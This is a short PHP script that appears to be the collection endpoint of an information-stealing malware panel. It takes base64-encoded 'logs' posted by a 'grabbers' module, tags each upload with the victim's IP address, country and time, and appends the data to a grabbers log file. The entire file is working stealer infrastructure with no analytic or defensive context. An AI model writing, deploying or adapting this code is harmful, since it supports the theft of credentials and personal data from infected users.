<?php

ini_set("max_execution_time", 0);

require("includes/geoip.php");
require("includes/functions.php");

if(isset($_POST["logs"]))
{
	$logs = trim($_POST["logs"]);
	$logs = str_replace(" ", "+", $logs);
	$logs = base64_decode($logs);

	if(isset($_POST["module"]) && $_POST["module"] == "grabbers")
	{
		$ip = $_SERVER["REMOTE_ADDR"];
		$country = get_country($ip);
		$date = date("d.m.Y H:i.s");
		save_to_file("logs/grabbers/grabbers.txt", "==============================\r\n IP: {$ip}\r\n Country: {$country}\r\n Date: {$date}\r\n==============================\r\n\r\n" . $logs . "\r\n");
	}
}

?>